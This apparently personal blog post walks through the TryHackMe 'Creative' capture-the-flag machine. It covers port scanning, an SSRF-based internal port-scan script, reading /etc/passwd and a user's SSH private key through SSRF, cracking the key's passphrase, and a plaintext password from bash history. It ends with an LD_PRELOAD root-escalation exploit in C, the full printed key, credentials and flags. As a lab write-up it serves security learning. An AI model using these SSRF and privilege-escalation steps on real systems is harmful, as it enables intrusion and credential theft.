<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Creative</title><meta name="description" content="scientia potentia est."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/hexo-theme-Claudia/images/favicon.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
Target IP Address: 10.10.162.171
Information GatheringNMAP ScanningNmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.

command used:

$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.162.171

→ output:
PORT   STATE SERVICE REASON
22/tcp open  ssh    .."><meta name="generator" content="Hexo 7.1.1"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Rãzvan's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Creative</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Scanning"><span class="toc-text">NMAP Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Full-Scanning"><span class="toc-text">NMAP Full Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-22-Default-Port-for-ssh"><span class="toc-text">TCP 22 (Default Port for ssh)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-80-Default-Port-for-HTTP"><span class="toc-text">TCP 80 (Default Port for HTTP)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Directory-Busting"><span class="toc-text">Directory Busting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Subdomain-Enumeration"><span class="toc-text">Subdomain Enumeration</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/TryHackMe"><i class="tag post-item-tag">TryHackMe</i></a><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Creative</h1><time class="has-text-grey" datetime="2024-07-25T06:52:03.000Z">2024-07-25</time><article class="mt-2 post-content"><p><img src="/../Creative_img/sddefault.jpg" alt="alt text"></p>
<p><strong>Target IP Address: 10.10.162.171</strong></p>
<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.162.171</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63</code></pre>

<h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul>
<li>command used:(scanning the ports we got)</li>
</ul>
<pre><code class="hljs bash">nmap -A -sC -sV -p22,80 10.10.162.171</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>

<p><code>|_http-title: Did not follow redirect to http://creative.thm</code></p>
<ul>
<li>add creative.thm to &#x2F;etc&#x2F;hosts</li>
</ul>
<h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p>
<p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p>
<p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
<ul>
<li>SSH package version:</li>
</ul>
<pre><code class="hljs bash">nc -vn 10.10.162.171 22</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">(UNKNOWN) [10.10.162.171] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5</code></pre>

<p>-&gt; SSH key fingerprint:</p>
<pre><code class="hljs bash">ssh root@10.10.162.171</code></pre>

<ul>
<li>output:</li>
</ul>
<pre><code class="hljs bash">The authenticity of host <span class="hljs-string">&#x27;10.10.162.171 (10.10.162.171)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span>
<span class="hljs-string">ED25519 key fingerprint is SHA256:09XvTnhtDcy1LRcuA8MJ6i3a1gN/7Prv5xmZF9v8Gq4.</span>
<span class="hljs-string">This key is not known by any other names.</span>
<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre>

<h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul>
<li><blockquote>
<p>Web Server:</p>
</blockquote>
</li>
</ul>
<pre><code class="hljs bash">curl -i http://creative.thm | <span class="hljs-built_in">head</span> -n 50</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash"> % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Jul 2024 07:32:35 GMT
Content-Type: text/html
Content-Length: 37589
Last-Modified: Fri, 16 Aug 2019 01:38:36 GMT
Connection: keep-alive
ETag: <span class="hljs-string">&quot;5d56091c-92d5&quot;</span>
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;
&lt;<span class="hljs-built_in">head</span>&gt;
        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;
    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;
    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Start your development with Creative Studio landing page.&quot;</span>&gt;
    &lt;meta name=<span class="hljs-string">&quot;author&quot;</span> content=<span class="hljs-string">&quot;Devcrud&quot;</span>&gt;
    &lt;title&gt;Creative Studio | Free Bootstrap 4.3.x template&lt;/title&gt;

    &lt;!-- font icons --&gt;
    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/vendors/themify-icons/css/themify-icons.css&quot;</span>&gt;

    &lt;!-- Bootstrap + Creative Studio main styles --&gt;
        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/creative-studio.css&quot;</span>&gt;

&lt;/head&gt;
&lt;body data-spy=<span class="hljs-string">&quot;scroll&quot;</span> data-target=<span class="hljs-string">&quot;.navbar&quot;</span> data-offset=<span class="hljs-string">&quot;40&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;home&quot;</span>&gt;
    
    &lt;!-- Page Navigation --&gt;
    &lt;nav class=<span class="hljs-string">&quot;navbar custom-navbar navbar-expand-lg navbar-dark&quot;</span> data-spy=<span class="hljs-string">&quot;affix&quot;</span> data-offset-top=<span class="hljs-string">&quot;20&quot;</span>&gt;
        &lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;
            &lt;a class=<span class="hljs-string">&quot;navbar-brand&quot;</span> href=<span class="hljs-string">&quot;#&quot;</span>&gt;
                &lt;img src=<span class="hljs-string">&quot;assets/imgs/logo.png&quot;</span> alt=<span class="hljs-string">&quot;Download free bootstrap 4 landing page, free boootstrap 4 templates, Download free bootstrap 4.1 landing page, free boootstrap 4.1.1 templates, Creative studio Landing page&quot;</span>&gt;
            &lt;/a&gt;
            &lt;button class=<span class="hljs-string">&quot;navbar-toggler&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;button&quot;</span> data-toggle=<span class="hljs-string">&quot;collapse&quot;</span> data-target=<span class="hljs-string">&quot;#navbarSupportedContent&quot;</span> aria-controls=<span class="hljs-string">&quot;navbarSupportedContent&quot;</span> aria-expanded=<span class="hljs-string">&quot;false&quot;</span> aria-label=<span class="hljs-string">&quot;Toggle navigation&quot;</span>&gt;
                &lt;span&gt;&lt;/span&gt;
            &lt;/button&gt;

            &lt;div class=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;navbarSupportedContent&quot;</span>&gt;
                &lt;ul class=<span class="hljs-string">&quot;navbar-nav ml-auto&quot;</span>&gt;
                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;
                        &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;#home&quot;</span>&gt;Home&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;
                        &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;#about&quot;</span>&gt;About&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;
                        &lt;a class=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;#service&quot;</span>&gt;Service&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;
 36 37589   36 13786    0     0  65219      0 --:--:-- --:--:-- --:--:-- 65336
curl: (23) Failure writing output to destination, passed 8932 returned 2348</code></pre>

<h2 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h2><p><strong>Directory Busting with Gobuster</strong>: “Directory busting with Gobuster involves scanning a website for hidden or unlisted directories by making numerous HTTP requests using a wordlist.”</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://creative.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">/assets               (Status: 301) [Size: 178] [--&gt; http://creative.thm/assets/]</code></pre>

<p>&#x2F;assets is apparently not found</p>
<h2 id="Subdomain-Enumeration"><a href="#Subdomain-Enumeration" class="headerlink" title="Subdomain Enumeration"></a>Subdomain Enumeration</h2><p><strong>Subdomain Enumeration with Gobuster</strong>: “Subdomain enumeration with Gobuster involves identifying subdomains of a target domain by making DNS requests using a wordlist.”</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ gobuster vhost -u http://creative.thm/ -w /usr/share/seclists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 40</code></pre>

<p>→ output:</p>
<pre><code class="hljs bash">Found: beta.creative.thm Status: 200 [Size: 591]</code></pre>

<p>We found <strong>beta.creative.thm</strong> let’s check it but first add it to &#x2F;etc&#x2F;hosts:</p>
<p><img src="/../Creative_img/1.png" alt="alt text"></p>
<p>I tried getting a reverse shell but it didnt work so i checked <strong><a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a></strong> and it showed us the html of <code>creative.thm</code></p>
<p><img src="/../Creative_img/2.png" alt="alt text"></p>
<p>→ output:</p>
<p><img src="/../Creative_img/3.png" alt="alt text"></p>
<p>So what i have in mind is maybe we can try <strong><a href="http://localhost:PORT">http://localhost:PORT</a></strong> to see if there are  any other HTTP services that we are not able to see.</p>
<p>After doing some research i found a python script for this:</p>
<p><strong>→ SCRIPT:</strong></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> urllib.parse
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor

<span class="hljs-keyword">def</span> <span class="hljs-title function_">send_post_request</span>(<span class="hljs-params">url, payload, headers</span>):
    <span class="hljs-keyword">try</span>:
        response = requests.post(url, data=payload, headers=headers)
        content_length = response.headers.get(<span class="hljs-string">&#x27;Content-Length&#x27;</span>)
        <span class="hljs-keyword">if</span> content_length != <span class="hljs-string">&#x27;13&#x27;</span>:  <span class="hljs-comment"># Check if content length isn&#x27;t 13</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;POST request to <span class="hljs-subst">&#123;url&#125;</span> with payload <span class="hljs-subst">&#123;payload&#125;</span> returned status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>, content length: <span class="hljs-subst">&#123;content_length&#125;</span>&quot;</span>)
    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error sending POST request: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    base_url = <span class="hljs-string">&quot;http://beta.creative.thm&quot;</span>
    headers = &#123;
        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;beta.creative.thm&quot;</span>,
        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,
        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,
        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>,
        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>,
        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,
        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://beta.creative.thm&quot;</span>,
        <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>,
        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://beta.creative.thm/&quot;</span>,
        <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>
    &#125;

    <span class="hljs-comment"># Using ThreadPoolExecutor to run 20 threads concurrently</span>
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> executor:
        <span class="hljs-keyword">for</span> port_number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65536</span>):
            url = <span class="hljs-string">f&quot;http://localhost:<span class="hljs-subst">&#123;port_number&#125;</span>&quot;</span>
            payload = <span class="hljs-string">f&quot;url=http%3A%2F%2Flocalhost%3A<span class="hljs-subst">&#123;port_number&#125;</span>&quot;</span>
            executor.submit(send_post_request, base_url, payload, headers)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    main()</code></pre>

<p>So basically the script loops through every port from 1 to 65535 and send it as post body to creative.thm. The script will show only responses that are not the Content-Length of 13 because that means the server couldn’t connect to that.</p>
<p><img src="/../Creative_img/4.png" alt="alt text"></p>
<p>Let’s do it now:</p>
<pre><code class="hljs python">└─$ python3 portscript.py</code></pre>

<p>We have 2 responses, one from PORT 80 that we already know and one from PORT 1337:</p>
<p><img src="/../Creative_img/5.png" alt="alt text"></p>
<p>So now we search for <code>http://localhost:1337</code>:</p>
<p><img src="/../Creative_img/6.png" alt="alt text"></p>
<p>→ output:</p>
<p><img src="/../Creative_img/7.png" alt="alt text"></p>
<p>Perfect! It seems like we have a directory listing now let’s see for &#x2F;etc&#x2F;passwd</p>
<p><img src="/../Creative_img/8.png" alt="alt text"></p>
<p>→ output:</p>
<pre><code class="hljs python">saad:x:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:saad:/home/saad:/<span class="hljs-built_in">bin</span>/bash</code></pre>

<p>So.. we’ve got a user saad alright so now the situation looks good.</p>
<p>From my experience with Tryhackme machines i know that there might be a chance that we find an <code>id_rsa</code> so we would connect with ssh to the user and then do PrivESC, let’s try that.</p>
<p>We would search for :</p>
<pre><code class="hljs python">http://localhost:<span class="hljs-number">1337</span>/home/saad/.ssh/id_rsa</code></pre>

<p><img src="/../Creative_img/9.png" alt="alt text"></p>
<p>→ output:</p>
<p><img src="/../Creative_img/10.png" alt="alt text"></p>
<p>Now create the file id_rsa and connect with ssh</p>
<p>→ SSH key:</p>
<pre><code class="hljs python">-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe wBK40FcBuzcLlzjLtfa21TgQxhjBYMPUvwzbgiGpJYEd6sXKeh9FXGYcgXCduq3rz/PSCs 48K+nYJ6Snob95PhfKfFL3x8JMc3sABvU87QxrJQ3PFsYmEzd38tmTiMQkn08Wf7g13MJ6 LzfUwwv9QZXMujHpExowWuwlEKBYiPeEK7mGvS0jJLsaEpQorZNvUhrUO4frSQA6/OTmXE d/hMX2910cAiCa5NlgBn4nH8y5bjSrygFUSVJiMBVUY0H77mj6gmJUoz5jv96fV+rBaFoB LGOy00gbX+2YTzBIJsKwOG97Q3HMnMKH+vCL09h/i3nQodWdqLP73U0PK2pu/nUFvGE8ju nkkRVNqqO5m0eYfdkWHLKz13JzohUBBsLrtj6c9hc8CIqErf5B573RKdhu4gy4JkCMEW1D xKhNWu+TI3VME1Q0ThJII/TMCR+Ih+/IDwgVTaW0LJR6Cn5nZzUHBLjkDV66vJRYN/3dJ5 bncTJ3dKFpec8AAAWQYx0osErJi/dcuK4vkpBkSG3N3iHsGeQh9KtrGHma9f5/l4HV1O2g NpdxT+pG8ti5+pJmbA12WIILPWPmq8RlXJoPY2Hg6swPFtgB0KCLotz8XMjYTB0PMHpa4S 98bHQ0G0t3WtkYewKtGIe5J5kEw6YxGVg7/uXQVohACNoniByRMhX2HG6mkXV9p2zi9ym+ Zd7LYPSZ6FTKLouqJbpcADwX6YywSV8uXIGAnT6u5UJMU7EbQhextQYqPOzihsVDUL/uSw quaPQYJ/8ZqBI5o3on+F2fVbNc7J/5t0gDd0tTzQDFZlMg3zJlnoVkxC+/NLuSrGrzC/<span class="hljs-number">52</span> 1gAlLqjcVeGmzXESqWWI+4rF4dnVuwBcHDskZ8TbKEGueBjMX3FdafP0SAl7+gRQNp3OsW VABMeWJmLDL+reNxAtsPTmDhXuDvoVfITx0V3Bu4UsRJpFl6rJpMgUyjeu3Dff9FjAqQRS qvsCB1lPAmb50y6v2qveOHJav4DbP7KCYRNR5C1W5R74rDUbLusyWFApWxHVpTDdHY6Zba +hmqT+kre2Qsg7fvBG7U8Fqe6jf1jVgSIMyUQ1UoowlmdBoP6/eI6Ce3p6lhqAfECb0mHT Z5tvpxF3QjP6mOPTy1YabeCrsKWoTN821bZUAW0UO5OIGYoQZo5fo6u5g7kj1LmXNG15AU ZAdKt56miOG5g4SsquDNVaJTQg7rsrVW3ghA4kE+BIRGmTuvKt5q4WZDB6gXXzJgEsZ5Kt KbURhk1zzqxKprI+yYTrqmxki1EhS2V6qDlYoVscYnIZK9IDV/1c22nNEkSTWhKzHe+6A7 qWNMkOw9xaIdB8WV/yfCf2nOtAAdAYSl28r7c+WSoucqvVBEWhblTqz1oL+bYeDhqRWusP e+gtkwODGaGQpUl793Eusk6vVYZni5xgOMDuERsREuT2ZsUP20AxVYw/mbUsOjeGpEoCGZ UBwl2LeGGSDZgZJC+DLOj/Rg0uy9gaADI0Nrwz6ushxqFUg1RDV+WzFxIw9uDqFiL0gHwZ FXiQLzmLQZ5X1JtWD2nqZwPnM66q9wOeMstYw8+8mJz5E/lTr80Nsde/eVYs3sY9STF+Ye 421hF21P2RLOYv4UM2aQ2hmfUb9MJ99Rj5UvpY83z4uUYu7Vmq2dMDcFsk7Zg8JdNDMg2O GpgYRcLH44/iPrKRKdtdlVXILLKLjFau8TPzyhKfsa6/3H485Sc/YT94D+bRcx3uL+U003 l7H2rPQ2RDPQeRyLX12uRMcakQLY7zIEyFhH0fMw3rCTcdp/FbkOUEOfXBPkSNWHh7f411 15y/K7bkNDwSi5Ul9yt05uSSEsibJVSfKbvETEFmSQ3tdSVq0PA3ymiBzWixlNOE123KI0 Zs0fwcKpS7h0GzikbIAcrln7ozSgjMzYawbQzEyjjR2QFySMWLGHAW4N7eZ6VfP3dBJxcs fq4rvw54iukm24T9qAnMXuj1+9joNomiScStTV98RmVy8WMs6WW4r0f7ynhN/S/LYHya+<span class="hljs-number">6</span> D2DK4fRX8v5bY9MAsuqlBIUYH0AVUieyDBnP9QsGNnlIm8TS9UuT/gv/<span class="hljs-number">6</span>+sWRpg7H5jkNz 69XRxDuLKV5jVElkEAn/B3bkpkAAcfSfXJphgtYsYbrgchSGtxWMX7FurkWbd0l0WyX//E 8OWhSwGmtO24YBhqQ47nGhDa8ceAJbr0uOIVm+Klfro2D7bPX0Wm2LC65Z6OQGvhrEbQwP nYcg+D3hFL9ZB4GfAZzwbLAP6EYJ+Tq6I/eiJ5LKs6Q32jMfITUy3wcEPkneMwdOkd35Od Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS ksrXEYjaMdndnvxBZ0zi9T+ywag= -----END OPENSSH PRIVATE KEY-----</code></pre>

<p> Alright so ive been stuck here for the past 30- 40 minutes i even looked at some write-ups and still didn’t understand why it didnt work </p>
<p>I was always changing <code>chmod 600</code> for the file <code>id_rsa</code> and it was giving me a permission denied public key error:</p>
<pre><code class="hljs python">Load key <span class="hljs-string">&quot;id_rsa&quot;</span>: Permission denied
saad@beta.creative.thm: Permission denied (publickey).
</code></pre>

<p>I just found that if we do chmod to 400 it will work:</p>
<pre><code class="hljs python">└─$ ssh saad@creative.thm -i id_rsa
Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>:</code></pre>

<p>So the key is protected with a passphrase and we’re going to crack it using <code>john</code> :</p>
<pre><code class="hljs python">└─$ ssh2john id_rsa &gt; tojohn

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tojohn</code></pre>

<p>→ output:</p>
<p><img src="/../Creative_img/11.png" alt="alt text"></p>
<p>Now we can connect through ssh with the passphrase sweetness:</p>
<pre><code class="hljs python">└─$ ssh saad@creative.thm -i id_rsa</code></pre>

<p>→</p>
<p><img src="/../Creative_img/12.png" alt="alt text"></p>
<p>User.txt Flag: <code>9a1ce90a7653d74ab98630b47b8b4a84</code></p>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>We can try to do sudo -l but in the end it asks for saad’s password which we don’t own.</p>
<p>We can check bash history, here we have a chance for the credentials to be shown</p>
<p>→ output:</p>
<pre><code class="hljs python">saad@m4lware:~$ cat .bash_history
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo <span class="hljs-string">&quot;saad:MyStrongestPasswordYet$4291&quot;</span> &gt; creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@<span class="hljs-number">192.169</span><span class="hljs-number">.155</span><span class="hljs-number">.104</span>
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al
</code></pre>

<p>BINGO we found the user and pass </p>
<pre><code class="hljs python">saad:MyStrongestPasswordYet$<span class="hljs-number">4291</span></code></pre>

<p>The <code>sudo -l</code> command lists the permitted (and forbidden) commands for the invoking user, helping to identify potential privilege escalation vectors on a Linux system during a penetration test.</p>
<p>→ sudo -l output</p>
<pre><code class="hljs python">Matching Defaults entries <span class="hljs-keyword">for</span> saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="hljs-built_in">bin</span>\:/usr/sbin\:/usr/<span class="hljs-built_in">bin</span>\:/sbin\:/<span class="hljs-built_in">bin</span>\:/snap/<span class="hljs-built_in">bin</span>, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/<span class="hljs-built_in">bin</span>/ping
</code></pre>

<p>With ping we can’t really escalate the privileges but we find something that might be interesting:</p>
<pre><code class="hljs python">env_keep+=LD_PRELOAD</code></pre>

<p>We searched on google about LD_PRELOAD privilege escalation and we got this:</p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
<p>In this article we learn how to take advantage of this and escalate privileges(get root access)</p>
<p>We are going to create a C-program in &#x2F;tmp</p>
<p>→</p>
<pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span>
<span class="hljs-comment">#include &lt;sys/types.h&gt;</span>
<span class="hljs-comment">#include &lt;stdlib.h&gt;</span>
void _init() &#123;
unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);
setgid(<span class="hljs-number">0</span>);
setuid(<span class="hljs-number">0</span>);
system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
&#125;</code></pre>

<p>Save it as <strong>shell.c</strong></p>
<p>Now we are going to run these commands but instead of <code>find</code> we are going to use <code>ping</code> because that’s where we have permissions:</p>
<pre><code class="hljs python">gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find</code></pre>

<p><img src="/../Creative_img/13.png" alt="alt text"></p>
<p>Root Flag:</p>
<pre><code class="hljs python"><span class="hljs-comment"># cat root.txt</span>
992bfd94b90da48634aed182aae7b99f</code></pre>

<p>Root.txt Flag: <code>992bfd94b90da48634aed182aae7b99f</code></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/07/25/Enterprise/" title="Enterprise"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Enterprise</span></a><a class="button is-default" href="/2024/07/25/Oh-My-WebServer/" title="Oh My WebServer"><span class="has-text-weight-semibold">Next: Oh My WebServer</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/razvan-popa-333740293"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Rãzvan 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by 